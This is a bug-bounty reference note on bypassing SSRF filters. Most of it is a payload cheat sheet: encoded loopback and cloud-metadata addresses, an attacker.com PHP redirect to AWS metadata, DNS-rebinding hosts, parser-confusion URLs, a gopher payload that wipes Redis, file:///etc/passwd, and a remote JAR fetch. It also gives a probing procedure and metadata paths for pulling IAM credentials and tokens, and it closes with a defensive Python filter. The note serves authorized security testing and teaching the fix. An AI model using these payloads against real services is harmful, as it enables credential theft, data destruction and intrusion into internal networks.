---
type: pattern
title: "SSRF Filter Bypass (IPv6 + Redirect + Alternate Representations)"
tags: [ssrf, filter-bypass, ipv6, redirect, webhook, bb-pattern]
status: active
category: vuln-pattern
source: "https://medium.com/@red_darkin/a-real-ssrf-story-from-hackerone-featuring-ipv6-redirects-9aa5e2ad8c2e"
last_updated: "2026-04-19"
---

# Pattern — SSRF Filter Bypass (IPv6 + Redirect + Alternate Representations)

> Most SSRF isn't "no filter at all" — it's an **incomplete filter**.
> This pattern collects the three most common categories of filter gaps + bypasses, with PoC starting points.

---

## Core Idea

Developer-written SSRF filters usually only block:
1. String matching against `127.0.0.1` / `localhost` / `169.254.169.254`
2. RFC1918 ranges (`10/8`, `172.16/12`, `192.168/16`)
3. Known cloud-metadata IPs

**The gaps that matter (this is where the bugs live)**:
- **Alternate string representations** of the same IP
- **Redirect targets not re-validated** (only the first hop is checked)
- **DNS rebinding** (a race condition at resolution time)
- **IPv6 representations** (IPv4-mapped IPv6 / IPv6 loopback)
- **Parser confusion** between the URL parser and the fetch library

---

## Bypass Cheat Sheet

### 1. Alternate IP representations (`127.0.0.1` == `169.254.169.254` — same IP, different string)

```
# All the ways to write 127.0.0.1
http://127.0.0.1
http://127.1                   # shorthand
http://127.0.1                 # shorthand
http://2130706433              # decimal
http://017700000001            # octal (full)
http://0177.0.0.1              # octal (mixed)
http://0x7f000001              # hex
http://0x7f.0x00.0x00.0x01     # hex (mixed)
http://[::1]                   # IPv6 loopback
http://[0:0:0:0:0:0:0:1]       # IPv6 full form
http://[::ffff:7f00:1]         # IPv4-mapped IPv6 (frequently missed by filters)
http://[::ffff:127.0.0.1]
http://localhost
http://0                       # some parsers resolve this to 0.0.0.0 -> 127.0.0.1
http://0.0.0.0                 # binds to all interfaces
http://[0:0:0:0:0:ffff:127.0.0.1]
```

```
# Equivalents of 169.254.169.254 (AWS metadata)
http://[::ffff:a9fe:a9fe]      # IPv4-mapped IPv6 — frequently missed
http://[::ffff:169.254.169.254]
http://2852039166               # decimal
http://0xa9fea9fe               # hex
http://169.254.169.254.nip.io   # public DNS that resolves to an internal address
```

### 2. Redirect bypass (attacker-controlled intermediary)

When the filter **only validates the first request URL** but follows redirects:

```php
<?php
// attacker.com/redir.php
header("Location: http://[::ffff:a9fe:a9fe]/latest/meta-data/");
exit;
?>
```

Submitted to a webhook:
```
POST /api/webhook
{"url": "https://attacker.com/redir.php"}
```

**Variants**:
- Redirect chains (`A → B → C`, a different representation at each hop)
- HTTP→HTTPS→HTTP downgrades (some clients don't re-validate on downgrade)
- Status-code variants (301 / 302 / 303 / 307 / 308 behave differently)

### 3. DNS Rebinding

```
# Self-hosted DNS: first response is a public IP (passes validation), second response is internal
http://attacker-rebind.example.com

# Public rebinding services
http://7f000001.<host>.rebind.it
http://make-rebind-do-its-job.repeat.it
```

### 4. Parser Confusion (URL syntax edge cases)

```
http://expected.com@127.0.0.1/        # userinfo trick
http://expected.com#@127.0.0.1/       # fragment trick
http://127.0.0.1.expected.com/        # subdomain trick
http://expected.com:80@127.0.0.1:80/  # double port
http://127.0.0.1\.expected.com/       # backslash
http://127.0.0.1%2eexpected.com/      # encoded dot
http://127.0.0.1%23.expected.com/     # encoded fragment
```

### 5. Scheme Bypass

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall    # Redis
dict://127.0.0.1:11211/stats                          # Memcached
file:///etc/passwd                                    # local file read
ftp://127.0.0.1                                       # FTP
sftp://127.0.0.1
ldap://127.0.0.1
jar:http://attacker.com/payload.jar!/                 # JNDI
```

### 6. Wildcard DNS Services

```
127.0.0.1.nip.io       → 127.0.0.1
127-0-0-1.nip.io       → 127.0.0.1
127.0.0.1.sslip.io     → 127.0.0.1
*.localtest.me         → 127.0.0.1
```

---

## Filter Detection SOP

When you find a webhook / URL-preview / SSRF candidate:

1. **Baseline**: send `http://127.0.0.1` directly → observe the response (200 / 403 / "blocked")
2. **Decimal**: send `http://2130706433` → same response as baseline = filter does string matching; different = the parser resolved it to an IP
3. **IPv6-mapped**: send `http://[::ffff:7f00:1]` → usually bypasses (most filters don't cover this form)
4. **Redirect test**: send an attacker-controlled URL, observe the `Location` header response → check if it's followed → if yes, chain directly
5. **Scheme test**: send `file:///etc/passwd` → check whether the client supports other protocols
6. **Out-of-band**: send `http://<your-collaborator-domain>` → confirm the request actually fires, and from which source IP

---

## Proving Internal Reachability

Once the filter is bypassed, confirm you actually reached something internal:

```
# AWS
http://[::ffff:a9fe:a9fe]/latest/meta-data/
http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/
http://[::ffff:a9fe:a9fe]/latest/user-data/

# GCP
http://[::ffff:a9fe:a9fe]/computeMetadata/v1/instance/service-accounts/default/token
# Note: GCP requires a Metadata-Flavor: Google header — this may not be injectable via a webhook

# Azure
http://[::ffff:a9fe:a9fe]/metadata/instance?api-version=2021-02-01
# Also requires a Metadata: true header

# Internal service port scan (manual, well-known ports only — do not automate this blindly)
http://[::ffff:7f00:1]:5000      # Flask debug
http://[::ffff:7f00:1]:6379      # Redis
http://[::ffff:7f00:1]:8080      # generic admin
http://[::ffff:7f00:1]:8126      # Datadog APM
http://[::ffff:7f00:1]:9200      # Elasticsearch
http://[::ffff:7f00:1]:11211     # Memcached
http://[::ffff:7f00:1]:27017     # MongoDB
http://[::ffff:7f00:1]:5432      # PostgreSQL
```

---

## Severity Escalation Path

| Proven fact | Severity |
|---|---|
| Able to send a request to an internal IP (no response content observed) | P3 / Medium |
| Able to read an internal HTTP service's response | P2 / High |
| Able to read cloud metadata (no token) | P2 / High |
| **Able to read an IAM credential / service-account token** | **P1 / Critical** |
| Able to write to an internal service (POST/PUT to an admin endpoint) | **P1 / Critical** |

Public writeups of this bug class show a recurring pattern: reaching metadata but **failing to extract an IAM token** gets triaged down from High to a modest bounty. **Escalating to P1 requires demonstrating credential extraction or a write primitive** — don't claim it without proof.

---

## Real-World Examples

| Case | Trigger point | Bypass technique |
|---|---|---|
| Public HackerOne writeup (webhook SSRF) | webhook URL field | IPv4-mapped IPv6 + missing redirect re-validation |
| Capital One (2019) | WAF SSRF | metadata + IAM role |
| Uber (multiple reports) | URL preview | DNS rebinding |

---

## Defensive Comparison (for fix recommendations)

```python
# Wrong: string matching alone
def is_safe(url):
    parsed = urlparse(url)
    return parsed.hostname not in BLOCKLIST  # string matching is too weak

# Correct: resolve first, then validate the IP; use an allowlist of domains
def is_safe(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    # Resolve all A/AAAA records
    addrs = [info[4][0] for info in socket.getaddrinfo(parsed.hostname, None)]
    for addr in addrs:
        ip = ipaddress.ip_address(addr)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast:
            return False
        # IPv4-mapped IPv6 is also private!
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            mapped = ip.ipv4_mapped
            if mapped.is_private or mapped.is_loopback:
                return False
    return True

# + Do not follow redirects, or re-validate the destination after following one
# + Use a fetch wrapper with a timeout and a response-size limit
# + Never forward the headers that metadata endpoints require (Metadata-Flavor / Metadata: true)
```

---

## Related Notes

- [[Pattern - CORS Misconfiguration]] — a neighboring "incomplete filter" bug class
- SSRF payload catalogs (bypass tables, wildcard-DNS services, scheme-based reads)
